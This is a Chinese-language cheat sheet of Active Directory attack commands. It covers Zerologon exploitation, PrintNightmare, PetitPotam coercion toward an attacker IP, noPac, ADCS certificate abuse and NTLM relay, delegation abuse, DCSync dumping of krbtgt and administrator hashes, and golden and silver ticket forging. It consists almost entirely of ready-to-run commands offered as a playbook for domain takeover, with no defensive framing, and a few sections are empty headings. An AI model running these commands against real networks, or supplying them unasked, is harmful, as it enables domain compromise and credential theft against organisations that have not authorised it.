# AD域渗透详细分类

## 1. Zerologon (CVE-2020-1472)

### 检测

```bash
python3 cve-2020-1472.py -target dc_ip -check
```

### 利用

```bash
python3 cve-2020-1472.py -target dc_ip -save dc.txt
secretsdump.py -hashes :[NTHASH] 'DOMAIN/TARGET$@dc_ip'
```

### 恢复

```bash
python3 cve-2020-1472.py -target dc_ip -restore dc.txt
```

---

## 2. PrintNightmare (CVE-2021-1675)

### 利用

```bash
python3 printnightmare.py domain/user:pass@target_ip
```

### 工具

```bash
impacket-dcomexec.py domain/user:pass@target
```

---

## 3. PetitPotam

```bash
python3 PetitPotam.py attacker_ip target_ip
python3 PetitPotam.py -d domain -u user -p pass attacker_ip target_ip
```

---

## 4. noPac/SAMAccountName

```bash
python3 noPac.py domain/user:pass@target_ip
python3 noPac.py -hashes :NTHASH domain/user@target_ip
```

---

## 5. ADCS攻击

### ESC1 - 证书模板权限

```bash
Certify.exe request /ca:ca-server /template:User /alt:target@domain.com
Certify.exe request /ca:ca-server /template:Admin /alt:target@domain.com
```

### ESC2 - 证书模板配置

### ESC3 - 注册代理

### ESC4 - 模板ACL

### ESC8 - NTLM Relay

```bash
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs
```

### 工具

```bash
Certify.exe find /vulnerable
PKINITtools.py
```

---

## 6. 约束委派

### 查找

```bash
Get-NetDelegation
powermad
```

### 利用

```bash
getST.py -spn cifs/target.domain.com -dc-ip dc.domain.com domain/user:pass
```

---

## 7. 资源约束委派

### 查找

```bash
powermad - Find-RBCD
```

### 利用

```bash
rbcd.py -action write -target 'dc' -delegate-from 'attacker$' -delegate-to 'target$' -dc-ip dc.domain.com
```

---

## 8. DCSync

### Impacket

```bash
secretsdump.py domain/user:pass@dc_ip
secretsdump.py -hashes :NTHASH domain/user@dc_ip
```

### Mimikatz

```bash
lsadump::dcsync /domain:domain.com /user:krbtgt
lsadump::dcsync /domain:domain.com /user:administrator
```

---

## 9. 黄金票据

### 创建

```bash
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /user:admin /ticket:gold.kirbi
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /user:admin /ptt
```

### 利用

```
psexec.py -k domain -target dc_ip
```

---

## 10. 白银票据

```bash
kerberos::silver /domain:domain.com /sid:S-1-5-21-xxx /target:target.domain.com /service:cifs /rc4:hash /user:admin
```

---

## 11. 跨域攻击

### 信任关系枚举

```bash
nltest /domain_trusts
Get-ADTrust -Filter *
```

### 攻击

```bash
# 利用林信任
mimikatz::lsadump::dcsync /domain:trusted.domain.com /user:krbtgt
```
